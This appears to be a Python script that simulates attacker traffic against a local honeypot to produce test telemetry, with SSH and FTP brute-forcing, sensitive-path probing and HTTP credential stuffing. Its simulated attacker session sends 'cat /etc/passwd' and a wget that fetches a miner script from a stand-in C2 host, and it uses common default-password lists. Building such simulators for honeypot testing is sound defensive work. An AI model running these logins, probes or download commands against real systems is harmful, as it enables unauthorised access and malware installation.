import socket
import urllib.request
import urllib.parse
import time
import sys

TARGET_HOST = "127.0.0.1"
SSH_PORT = 2222
HTTP_PORT = 8080
FTP_PORT = 2121

def print_step(title):
    print(f"\n\033[94m[=== SIMULATION: {title} ===]\033[0m")

def simulate_ssh_brute_force():
    print_step("SSH Brute-Force & Command Execution")
    credentials = [
        ("root", "toor"),
        ("admin", "admin123"),
        ("ubuntu", "ubuntu"),
        ("service_account", "Spring2026!"),
        ("root", "password")
    ]

    for user, pwd in credentials:
        print(f"  -> Attempting SSH login: {user} / {pwd}")
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5.0)
            s.connect((TARGET_HOST, SSH_PORT))
            banner = s.recv(1024)
            time.sleep(0.2)
            
            # Send username
            s.recv(1024) # "login: "
            s.sendall(f"{user}\r\n".encode())
            time.sleep(0.2)
            
            # Send password
            s.recv(1024) # "Password: "
            s.sendall(f"{pwd}\r\n".encode())
            time.sleep(0.5)

            # If last credential, simulate attacker command execution
            if user == "root" and pwd == "password":
                commands = ["whoami", "id", "uname -a", "cat /etc/passwd", "wget http://c2-drop.xyz/miner.sh", "exit"]
                for cmd in commands:
                    print(f"     [Attacker Shell] Executing: {cmd}")
                    s.sendall(f"{cmd}\r\n".encode())
                    time.sleep(0.3)
                    resp = s.recv(2048)

            s.close()
        except Exception as e:
            print(f"     [!] Connection error: {e}")
        time.sleep(0.4)

def simulate_http_web_scan():
    print_step("HTTP Reconnaissance & Sensitive Path Fuzzing")
    paths = [
        "/",
        "/robots.txt",
        "/.env",
        "/wp-login.php",
        "/phpmyadmin/index.php",
        "/api/v1/debug",
        "/internal-backup/backup.sql"
    ]

    for p in paths:
        url = f"http://{TARGET_HOST}:{HTTP_PORT}{p}"
        print(f"  -> Probing URL: {url}")
        try:
            req = urllib.request.Request(
                url,
                headers={"User-Agent": "Mozilla/5.0 (Adversary-Recon/1.0; KaliLinux)"}
            )
            with urllib.request.urlopen(req, timeout=3) as resp:
                print(f"     Status: {resp.status}")
        except urllib.error.HTTPError as e:
            print(f"     Status: {e.code}")
        except Exception as e:
            print(f"     [!] Connection failed: {e}")
        time.sleep(0.3)

def simulate_http_credential_stuffing():
    print_step("HTTP Login Credential Stuffing")
    url = f"http://{TARGET_HOST}:{HTTP_PORT}/login"
    pairs = [
        ("admin@corp.local", "Admin@123"),
        ("devops@corp.local", "P@ssw0rd2026"),
        ("ceo@corp.local", "Welcome1"),
        ("support@corp.local", "Helpdesk2026!")
    ]

    for u, p in pairs:
        print(f"  -> Submitting Form Credentials: {u} / {p}")
        data = urllib.parse.urlencode({"username": u, "password": p}).encode("utf-8")
        req = urllib.request.Request(url, data=data, method="POST", headers={
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": "Hydra/9.5 (Credential-Stuffer)"
        })
        try:
            with urllib.request.urlopen(req, timeout=3) as resp:
                print(f"     Response: {resp.status}")
        except urllib.error.HTTPError as e:
            print(f"     Response: {e.code} (Expected honeypot rejection)")
        except Exception as e:
            print(f"     [!] Connection error: {e}")
        time.sleep(0.4)

def simulate_ftp_recon():
    print_step("FTP Automated Scanner Probe")
    ftp_creds = [
        ("anonymous", "guest@example.com"),
        ("admin", "12345"),
        ("backup", "backup")
    ]

    for u, p in ftp_creds:
        print(f"  -> Testing FTP Credentials: {u} / {p}")
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5.0)
            s.connect((TARGET_HOST, FTP_PORT))
            s.recv(1024) # Banner
            s.sendall(f"USER {u}\r\n".encode())
            time.sleep(0.2)
            s.recv(1024)
            s.sendall(f"PASS {p}\r\n".encode())
            time.sleep(0.2)
            s.recv(1024)
            s.sendall(b"QUIT\r\n")
            s.close()
        except Exception as e:
            print(f"     [!] FTP Connection error: {e}")
        time.sleep(0.3)

def main():
    print("""
  ╔══════════════════════════════════════════════════════╗
  ║          HONEYPOT ADVERSARY TRAFFIC SIMULATOR        ║
  ║      [ Generating local test telemetry events ]      ║
  ╚══════════════════════════════════════════════════════╝
    """)
    print(f"[*] Targeting loopback honeypot on {TARGET_HOST}")
    
    try:
        simulate_ssh_brute_force()
        simulate_http_web_scan()
        simulate_http_credential_stuffing()
        simulate_ftp_recon()
        print("\n\033[92m[✓] Simulation completed successfully!\033[0m")
        print("[*] To analyze captured telemetry and view the dashboard, run:")
        print("    python analytics/analyze_logs.py\n")
    except KeyboardInterrupt:
        print("\nSimulation aborted.")

if __name__ == "__main__":
    main()
